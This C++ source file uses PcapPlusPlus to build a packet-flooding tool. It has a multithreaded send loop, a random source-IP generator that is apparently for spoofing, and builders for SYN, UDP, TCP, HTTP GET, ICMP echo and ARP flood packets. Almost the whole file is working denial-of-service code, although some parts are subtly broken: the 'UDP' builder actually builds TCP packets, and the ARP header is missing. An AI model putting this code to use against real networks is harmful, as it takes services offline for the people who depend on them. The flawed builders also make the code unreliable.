#include "PcapLiveDeviceList.h"
#include "Packet.h"
#include "EthLayer.h"
#include "IPv4Layer.h"
#include "TcpLayer.h"
#include "UdpLayer.h"
#include "PayloadLayer.h"
#include "IcmpLayer.h"
#include <iostream>
#include <string>
#include <random>
#include <thread>
#include <functional>
#include <chrono>
#include <vector>
#include <cstdlib>
#include <netinet/in.h>

void simulateFlood(const std::function<pcpp::Packet()>& packetBuilder,pcpp::PcapLiveDevice* dev, int packetCount,int threadCount = 1) {
    auto floodTask = [&](int count) {
        for (int i = 0; i < count; ++i) {
            pcpp::Packet packet = packetBuilder();
            if (!dev->sendPacket(&packet)) {
                std::cerr << "Packet send failed at iteration No. " << i << std::endl;
            }
        }
    };

    std::vector<std::thread> threads;

    int packetsPerThread = packetCount / threadCount;

    for (int i = 0; i < threadCount; ++i) {
        threads.emplace_back(floodTask, packetsPerThread);
    }

    for (auto &thread: threads) {
        thread.join();
    }
}
    pcpp::IPv4Address generateRandomIp()
    {
    std::random_device rd;
    std::mt19937_64 gen(rd());
    std::uniform_int_distribution <> dist (1,254);
    return pcpp::IPv4Address(std::to_string(dist(gen)) + "." + std::to_string(dist(gen)) + "." +
                                 std::to_string(dist(gen)) + "." + std::to_string(dist(gen)));
    }

    //SYN flood packet builder
    pcpp::Packet buildSYNPacket(const pcpp::MacAddress* srcMac, const pcpp::MacAddress* dstMac,
                                const pcpp::IPv4Address* srcIP, const pcpp::IPv4Address* dstIP){
        pcpp::Packet packet(100);
        auto* ethLayer = new pcpp::EthLayer(*srcMac,*dstMac);
        auto* iPv4Layer = new pcpp::IPv4Layer(*srcIP,*dstIP);
        auto* tcpLayer = new pcpp::TcpLayer(12345,80);
        tcpLayer->getTcpHeader()->synFlag=1;
        packet.addLayer(ethLayer);
        packet.addLayer(iPv4Layer);
        packet.addLayer(tcpLayer);
        packet.computeCalculateFields();
        return packet;
    }
    //UDP flood packet builder
    pcpp::Packet buildUDPPacket(const pcpp::MacAddress* srcMac, const pcpp::MacAddress* dstMac,
                                const pcpp::IPv4Address* srcIP, const pcpp::IPv4Address* dstIP){
        pcpp::Packet packet(100);
        auto* ethLayer = new pcpp::EthLayer (*srcMac,*dstMac);
        auto* iPv4Layer = new pcpp::IPv4Layer (*srcIP,*dstIP);
        auto* tcpLayer = new pcpp::TcpLayer (12345,80);
        packet.addLayer(ethLayer);
        packet.addLayer(iPv4Layer);
        packet.addLayer(tcpLayer);
        packet.computeCalculateFields();
        return packet;
    }
    //TCP flood packet builder
    pcpp::Packet buildTCPPacket(const pcpp::MacAddress* srcMac, const pcpp::MacAddress* dstMac,
                                const pcpp::IPv4Address* srcIP, const pcpp::IPv4Address* dstIP){
        pcpp::Packet packet(100);
        auto* ethLayer = new pcpp::EthLayer(*srcMac,*dstMac);
        auto* iPv4Layer = new pcpp::IPv4Layer(*srcIP,*dstIP);
        auto* tcpLayer = new pcpp::TcpLayer(12345,80);
        packet.addLayer(ethLayer);
        packet.addLayer(iPv4Layer);
        packet.addLayer(tcpLayer);
        packet.computeCalculateFields();
        return packet;
}
    //HTTP flood packet builder
    pcpp::Packet buildHTTPPacket(const pcpp::MacAddress* srcMac, const pcpp::MacAddress* dstMac,
                                 const pcpp::IPv4Address* srcIP, const pcpp::IPv4Address* dstIP){
        pcpp::Packet packet(200);
        auto* ethLayer = new pcpp::EthLayer(*srcMac,*dstMac);
        auto* iPv4Layer = new pcpp::IPv4Layer(*srcIP,*dstIP);
        auto* tcpLayer = new pcpp::TcpLayer(12345,80);
        tcpLayer->getTcpHeader()->pshFlag=1;
        tcpLayer->getTcpHeader()->ackFlag=1;

        std::string httpRequest = "GET / HTTP/1.1\r\nHost: " + (*dstIP).toString() +"\r\n\r\n";
        auto* payloadLayer = new pcpp::PayloadLayer((uint8_t*)httpRequest.c_str(),httpRequest.size(),tcpLayer,&packet);

        packet.addLayer(ethLayer);
        packet.addLayer(iPv4Layer);
        packet.addLayer(tcpLayer);
        packet.addLayer(payloadLayer);
        packet.computeCalculateFields();
        return packet;
    }
    // ICMP flood packet builder
    pcpp::Packet buildIcmpPacket(const pcpp::MacAddress& srcMac, const pcpp::MacAddress& dstMac,
                             const pcpp::IPv4Address& srcIp, const pcpp::IPv4Address& dstIp) {
    pcpp::Packet packet(100);
    auto* ethLayer = new pcpp::EthLayer(srcMac, dstMac, PCPP_ETHERTYPE_IP);
    auto* ipLayer = new pcpp::IPv4Layer(srcIp, dstIp);
    ipLayer->getIPv4Header()->timeToLive = 64;
    auto*icmpLayer = new pcpp::IcmpLayer();
    uint16_t id = htons(1);

    auto randomNumberGenerator = []() {
        std::random_device rd;
        std::mt19937_64 gen(rd());
        std::uniform_int_distribution<> distrib(0, 65535);
        return distrib(gen);
    };

    uint16_t seq = htons(randomNumberGenerator());
    icmpLayer->setEchoRequestData(id, seq, 0 /* timestamp */, nullptr, 0);
    packet.addLayer(ethLayer);
    packet.addLayer(ipLayer);
    packet.addLayer(icmpLayer);
    packet.computeCalculateFields();
    return packet;
}
    // ARP flood packet builder
    pcpp::Packet buildArpPacket(const pcpp::MacAddress& srcMac, const pcpp::MacAddress& dstMac,
                            const pcpp::IPv4Address& srcIp, const pcpp::IPv4Address& dstIp) {
        pcpp::Packet packet(60);
    auto* ethLayer = new pcpp::EthLayer(srcMac, dstMac, PCPP_ETHERTYPE_ARP);
    auto* arpLayer = new pcpp::ArpLayer(pcpp::ARP_REQUEST, srcMac, dstMac, srcIp, dstIp);
    packet.addLayer(ethLayer);
    packet.addLayer(arpLayer);
    packet.computeCalculateFields();
    return packet;
}
